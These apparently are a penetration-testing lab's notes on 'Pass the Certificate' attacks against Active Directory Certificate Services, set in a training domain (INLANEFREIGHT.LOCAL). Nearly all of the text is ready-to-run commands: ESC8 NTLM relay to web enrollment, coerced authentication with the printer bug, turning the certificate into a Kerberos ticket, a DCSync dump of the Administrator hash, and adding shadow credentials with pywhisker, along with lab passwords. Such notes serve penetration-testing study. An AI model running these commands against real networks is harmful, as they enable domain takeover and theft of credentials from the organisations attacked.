# Pass the Certificate

## Overview
* Abuse Active Directory Certificate Services (ADCS) to obtain certificates that can be used for authentication
* Most common: ESC8 (NTLM relay to ADCS web enrollment)

## ESC8 - NTLM Relay to ADCS Web Enrollment

### Set Up Relay

```
impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```

### Coerce Authentication (Printer Bug)

```
python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12
```

### Obtain TGT from Certificate (gettgtpkinit.py)

```
python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache
```

### DCSync with Machine Account TGT

```
export KRB5CCNAME=/tmp/dc.ccache
impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
```

## Shadow Credentials (pywhisker)

### Add Shadow Credential

```
pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add
```

### Obtain TGT from Shadow Credential PFX

```
python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
```
